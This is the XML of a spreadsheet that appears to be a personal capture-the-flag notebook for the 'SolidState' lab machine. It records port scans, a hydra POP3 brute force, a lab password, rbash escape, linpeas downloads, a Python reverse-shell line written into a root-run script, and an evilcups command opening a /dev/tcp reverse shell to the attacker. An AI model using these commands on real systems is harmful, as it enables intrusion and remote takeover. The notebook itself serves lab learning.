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33500F2E-A2E0-4D99-BCEE-96DB2F58DE02}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720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7" i="1" l="1"/>
  <c r="F7" i="1"/>
  <c r="F6" i="1"/>
  <c r="E6" i="1"/>
  <c r="D9" i="3"/>
  <c r="C4" i="3"/>
  <c r="C5" i="3"/>
  <c r="C6" i="3"/>
  <c r="C7" i="3"/>
  <c r="C8" i="3"/>
  <c r="C9" i="3"/>
  <c r="C10" i="3"/>
  <c r="C3" i="3"/>
  <c r="D4" i="3"/>
  <c r="D5" i="3"/>
  <c r="D6" i="3"/>
  <c r="D7" i="3"/>
  <c r="D8" i="3"/>
  <c r="D10" i="3"/>
  <c r="D3" i="3"/>
  <c r="F3" i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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="146" uniqueCount="103">
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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110/tcp</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>22/tcp</t>
  </si>
  <si>
    <t>4555/tcp</t>
  </si>
  <si>
    <t>awk -F' - ' '{split($1,a," ");split($3,b,"  -&gt;");gsub(/^[ \t]+|[ \t]+$/,"",b[1]);print a[2],b[1]}' dirsearch_output.txt</t>
  </si>
  <si>
    <t>200 /about.html</t>
  </si>
  <si>
    <t>301 /assets</t>
  </si>
  <si>
    <t>200 /assets/</t>
  </si>
  <si>
    <t>301 /images</t>
  </si>
  <si>
    <t>200 /images/</t>
  </si>
  <si>
    <t>200 /index.html</t>
  </si>
  <si>
    <t>200 /LICENSE.txt</t>
  </si>
  <si>
    <t>200 /README.txt</t>
  </si>
  <si>
    <t>110/tcp  open  pop3?</t>
  </si>
  <si>
    <t>4555/tcp open  rsip?</t>
  </si>
  <si>
    <t>22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)</t>
  </si>
  <si>
    <t>/services.html</t>
  </si>
  <si>
    <t>200 /services.html</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Home - Solid State Security</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST</t>
    </r>
  </si>
  <si>
    <t>webadmin@solid-state-security.com</t>
  </si>
  <si>
    <t>Home page.</t>
  </si>
  <si>
    <t>Nothing crazy interesting.</t>
  </si>
  <si>
    <t>HTML5 UP. HTML5 UP is a popular platform created by a developer known as "ajlkn" that offers free, responsive, and customizable website templates.</t>
  </si>
  <si>
    <t>https://github.com/zce/html5up/tree/master/solid-state</t>
  </si>
  <si>
    <t>Just the pictures from the website.</t>
  </si>
  <si>
    <t>JS and HTC files. Could be interesting but I think this is a hole.</t>
  </si>
  <si>
    <t>Just usage license</t>
  </si>
  <si>
    <t>There is a submit a message page. POST request. All service links point to services.html. Posting returns a normal page. No info.</t>
  </si>
  <si>
    <t>root:root
user: james
user: thomas
user: john
user: mindy
user: mailadmin</t>
  </si>
  <si>
    <t>Weird it was open! I guess masscan missed it!</t>
  </si>
  <si>
    <t>25 /tcp</t>
  </si>
  <si>
    <t>25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25</t>
  </si>
  <si>
    <t>username: mindy
pass: P@55W0rd1!2@</t>
  </si>
  <si>
    <t>Yeah it worked with Mindy's creds.</t>
  </si>
  <si>
    <t>user.txt: d2827f96363f08295f51eb92d477bb09</t>
  </si>
  <si>
    <t>https://hackviser.com/tactics/pentesting/services/pop3</t>
  </si>
  <si>
    <t>https://www.rapid7.com/db/modules/exploit/linux/smtp/apache_james_exec/</t>
  </si>
  <si>
    <t>mindy</t>
  </si>
  <si>
    <t>export PATH=$PATH:/tmp</t>
  </si>
  <si>
    <t>#-rbash
bash</t>
  </si>
  <si>
    <t>TCP</t>
  </si>
  <si>
    <t>netstat -lntu</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">PORT    STATE SERVICE VERSION
631/tcp open  ipp     </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>CUPS 2.2</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Home - CUPS 2.2.1</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">POP3 server. Mail likely need creds.
JAMES POP3 Server 2.3.2
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>John has 1 email.</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
John, 
Can you please </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>restrict</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
Thank you in advance.
Respectfully,
James
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Mindy has SSH creds.</t>
    </r>
  </si>
  <si>
    <t>netstat -tulpn</t>
  </si>
  <si>
    <t>Linux version 4.9.0-3-686-pae (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06)</t>
  </si>
  <si>
    <t>./linpeas.sh | tee linpeas.txt</t>
  </si>
  <si>
    <t>wget http://[attack IP]:8080/linpeas.sh</t>
  </si>
  <si>
    <t>119/tcp</t>
  </si>
  <si>
    <t>Another missed port?</t>
  </si>
  <si>
    <t xml:space="preserve">5355/tcp open  llmnr? </t>
  </si>
  <si>
    <t>119/tcp open  nntp?</t>
  </si>
  <si>
    <t>solidstate</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">ii  cups-browsed                          </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">1.11.6-3     </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">                               i386         OpenPrinting CUPS Filters - cups-browsed</t>
    </r>
  </si>
  <si>
    <t>https://www.cyberciti.biz/faq/what-process-has-open-linux-port/
https://securitylabs.datadoghq.com/articles/emerging-vulnerability-cups/
https://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained
https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html
https://www.disk91.com/2020/technology/systems/transfer-udp-over-ssh/</t>
  </si>
  <si>
    <t>ps -ef | grep cups</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Version 2.2.1 I think?
cups is running under </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>root.</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
I think I need to access UDP from SSH.
I think I made a lot of progress today. </t>
    </r>
  </si>
  <si>
    <t>https://www.tecmint.com/rbash-restricted-bash-shell/
https://stackoverflow.com/questions/6085156/using-semicolon-vs-plus-with-exec-in-find</t>
  </si>
  <si>
    <t>find . -user james -exec ls -l '{}' \; 2&gt;/dev/null</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">./bin:
total 8
drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 .
drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 ..
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>lrwxrwxrwx 1 root  root     8 Aug 22  2017 cat -&gt; /bin/cat
lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -&gt; /bin/env
lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -&gt; /bin/ls</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
/home/james/.bash_history
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">/opt/tmp.py  </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> 
$PATH=/usr/local/bin:/usr/bin:/bin:/usr/games 
Kernel: CVE-2017-16995, CVE-2021-27365, CVE-2021-22555 
/usr/share/gutenprint/5.2/xml/printers.xml
uid=1000(james) gid=1000(osboxes) groups=1000(osboxes),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),114(lpadmin),116(scanner)
# cat root.txt
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>be1310ac2d89645d7021513e5400f180</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">I think I have to elevate it using the exploit.
Didn't work. Okay so maybe have to read.
Restricted shell
James has group osboxes weird.
PATH is read only
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Ok just had to specify bash before ssh in.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Weird there's a local port 631.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ipp?</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Kernel checks are bad but don't seem relevant to testing.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Lol I needed a hint I was too far down the hole of cups. It was /opt/tmp.py.</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Note that PSpy is a cool tool that can see what commands are being run.</t>
    </r>
  </si>
  <si>
    <t>uname -a</t>
  </si>
  <si>
    <t>wget --recursive --no-parent http://[attack IP]:8080/</t>
  </si>
  <si>
    <t>os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc [attack IP] 5555 &gt;/tmp/f')</t>
  </si>
  <si>
    <t>wget http://[attack IP]:8080/pspy32</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -v [victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://[victim IP] -i 200-299,300-399 </t>
  </si>
  <si>
    <t>nc [victim IP] 4445</t>
  </si>
  <si>
    <t>hydra -L users.txt -p 12345678 pop3://[victim IP]</t>
  </si>
  <si>
    <t>telnet [victim IP] 110</t>
  </si>
  <si>
    <t>ssh mindy@[victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">ssh mindy@[victim IP] -t "bash" </t>
  </si>
  <si>
    <t>ssh -L 631:127.0.0.1:631 mindy@[victim IP]</t>
  </si>
  <si>
    <t>wget http://[victim IP]:8080/linpeas.txt</t>
  </si>
  <si>
    <t>python3 evilcups.py [attack IP] [victim IP] 'bash -c "bash -i &gt;&amp; /dev/tcp/[attack IP]/4444 0&gt;&amp;1"'</t>
  </si>
  <si>
    <t>local# ssh -L 6666:localhost:6666 mindy@[victim IP]
server# mkfifo /tmp/fifo
server# nc -l -p 6666 &lt; /tmp/fifo | nc -u 127.0.0.1 631 &gt; /tmp/fifo
local# mkfifo /tmp/fifo
local# sudo nc -l -u -p 631 &lt; /tmp/fifo | nc 127.0.0.1 6666 &gt; /tmp/fifo
python3 evilcups.py [attack IP] 127.0.0.1 'bash -c "bash -i &gt;&amp; /dev/tcp/[attack IP]/4444 0&gt;&amp;1"'</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>http://[victim IP]/</t>
  </si>
  <si>
    <t>Oops this got deleted. Essentially logged in as root and changed everyones passwords. Then was able to go back to pop3 and find all user emails.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</si>
</sst>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2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apid7.com/db/modules/exploit/linux/smtp/apache_james_exec/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hackviser.com/tactics/pentesting/services/pop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zce/html5up/tree/master/solid-stat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cyberciti.biz/faq/what-process-has-open-linux-port/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.tecmint.com/rbash-restricted-bash-shel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8"/>
  <sheetViews>
    <sheetView tabSelected="1" topLeftCell="B1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="G22" sqref="G22"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="20.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="29.109375" style="2" bestFit="1" customWidth="1"/>
    <col min="3" max="4" width="15.109375" style="2" customWidth="1"/>
    <col min="5" max="5" width="10.33203125" style="2" customWidth="1"/>
    <col min="6" max="6" width="14.21875" style="2" customWidth="1"/>
    <col min="7" max="7" width="55" style="2" customWidth="1"/>
    <col min="8" max="8" width="62.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="48.88671875" style="2" customWidth="1"/>
    <col min="10" max="10" width="47.44140625" style="2" customWidth="1"/>
    <col min="11" max="11" width="52.21875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.886718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2" t="s">
        <v>100</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>75</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>23</v>
      </c>
      <c r="E2" s="6" t="str">
        <f>LEFT($D2,FIND("/",$D2)-1)</f>
        <v>110</v>
      </c>
      <c r="F2" s="7" t="str">
        <f>MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>36</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>66</v>
      </c>
      <c r="I2" s="4" t="s">
        <v>55</v>
      </c>
      <c r="J2" s="5" t="s">
        <v>58</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>100</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>75</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>24</v>
      </c>
      <c r="E3" s="6" t="str">
        <f t="shared" ref="E3:E7" si="0">LEFT($D3,FIND("/",$D3)-1)</f>
        <v>80</v>
      </c>
      <c r="F3" s="7" t="str">
        <f t="shared" ref="F3:F7" si="1">MID($D3,FIND("/",$D3)+1,LEN($D3))</f>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>100</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>75</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>25</v>
      </c>
      <c r="E4" s="6" t="str">
        <f t="shared" si="0"/>
        <v>22</v>
      </c>
      <c r="F4" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>38</v>
      </c>
      <c r="H4" s="4" t="s">
        <v>56</v>
      </c>
      <c r="I4" s="4" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>100</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>75</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>26</v>
      </c>
      <c r="E5" s="6" t="str">
        <f t="shared" si="0"/>
        <v>4555</v>
      </c>
      <c r="F5" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>37</v>
      </c>
      <c r="H5" s="2" t="s">
        <v>102</v>
      </c>
      <c r="I5" s="2" t="s">
        <v>51</v>
      </c>
      <c r="J5" s="5" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="1" t="s">
        <v>100</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>75</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>53</v>
      </c>
      <c r="E6" s="6" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">25 </v>
      </c>
      <c r="F6" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>54</v>
      </c>
      <c r="H6" s="4" t="s">
        <v>52</v>
      </c>
      <c r="J6" s="5"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="1" t="s">
        <v>100</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>75</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>71</v>
      </c>
      <c r="E7" s="6" t="str">
        <f t="shared" si="0"/>
        <v>119</v>
      </c>
      <c r="F7" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>74</v>
      </c>
      <c r="H7" s="2" t="s">
        <v>72</v>
      </c>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E8" s="6"/>
      <c r="F8" s="7"/>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="1"/>
      <c r="E9" s="6"/>
      <c r="F9" s="7"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="6"/>
      <c r="F10" s="7"/>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="1"/>
      <c r="E11" s="6"/>
      <c r="F11" s="7"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="6"/>
      <c r="F12" s="7"/>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="1"/>
      <c r="E13" s="6"/>
      <c r="F13" s="7"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E14" s="6"/>
      <c r="F14" s="7"/>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E15" s="6"/>
      <c r="F15" s="7"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E16" s="6"/>
      <c r="F16" s="7"/>
    </row>
    <row r="17" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E17" s="6"/>
      <c r="F17" s="7"/>
    </row>
    <row r="18" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="1"/>
      <c r="E18" s="6"/>
      <c r="F18" s="7"/>
    </row>
    <row r="19" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1"/>
      <c r="E19" s="6"/>
      <c r="F19" s="7"/>
    </row>
    <row r="20" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="1"/>
      <c r="E20" s="6"/>
      <c r="F20" s="7"/>
    </row>
    <row r="21" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1"/>
      <c r="E21" s="6"/>
      <c r="F21" s="7"/>
    </row>
    <row r="22" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="1"/>
      <c r="E22" s="6"/>
      <c r="F22" s="7"/>
    </row>
    <row r="23" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1"/>
      <c r="E23" s="6"/>
      <c r="F23" s="7"/>
    </row>
    <row r="24" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="6"/>
      <c r="F24" s="7"/>
    </row>
    <row r="25" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E25" s="6"/>
      <c r="F25" s="7"/>
    </row>
    <row r="26" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="1"/>
      <c r="E26" s="6"/>
      <c r="F26" s="7"/>
    </row>
    <row r="27" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E27" s="6"/>
      <c r="F27" s="7"/>
    </row>
    <row r="28" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="1"/>
      <c r="E28" s="6"/>
      <c r="F28" s="7"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K29">
    <sortCondition ref="F2:F29"/>
    <sortCondition ref="E2:E29"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="J2" r:id="rId1" xr:uid="{6E52AC78-407F-4C45-811C-E0C09091A8D7}"/>
    <hyperlink ref="J5" r:id="rId2" xr:uid="{674483F1-041B-4FD5-BD7B-C8CC812F4D3B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H24"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="E2" sqref="E2"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="23.44140625" style="2" customWidth="1"/>
    <col min="2" max="2" width="39.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="18.5546875" style="2" customWidth="1"/>
    <col min="4" max="4" width="34.33203125" style="2" customWidth="1"/>
    <col min="5" max="6" width="64" style="2" customWidth="1"/>
    <col min="7" max="7" width="22.88671875" style="2" customWidth="1"/>
    <col min="8" max="8" width="49.44140625" style="2" customWidth="1"/>
    <col min="9" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>101</v>
      </c>
      <c r="C2" s="2">
        <v>200</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>50</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="3" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>28</v>
      </c>
      <c r="C3" s="2" t="str">
        <f>LEFT($B3,FIND("/",$B3)-1)</f>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D3" s="2" t="str">
        <f>MID($B3,FIND("/",$B3)+1,LEN($B3))</f>
        <v>about.html</v>
      </c>
      <c r="E3" s="2" t="s">
        <v>44</v>
      </c>
      <c r="G3" s="5"/>
    </row>
    <row r="4" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>29</v>
      </c>
      <c r="C4" s="2" t="str">
        <f t="shared" ref="C4:C10" si="0">LEFT($B4,FIND("/",$B4)-1)</f>
        <v xml:space="preserve">301 </v>
      </c>
      <c r="D4" s="2" t="str">
        <f t="shared" ref="D4:D10" si="1">MID($B4,FIND("/",$B4)+1,LEN($B4))</f>
        <v>assets</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>48</v>
      </c>
    </row>
    <row r="5" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>30</v>
      </c>
      <c r="C5" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D5" s="2" t="str">
        <f t="shared" si="1"/>
        <v>assets/</v>
      </c>
      <c r="E5" s="1" t="s">
        <v>48</v>
      </c>
    </row>
    <row r="6" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>101</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>31</v>
      </c>
      <c r="C6" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">301 </v>
      </c>
      <c r="D6" s="2" t="str">
        <f t="shared" si="1"/>
        <v>images</v>
      </c>
      <c r="E6" s="1" t="s">
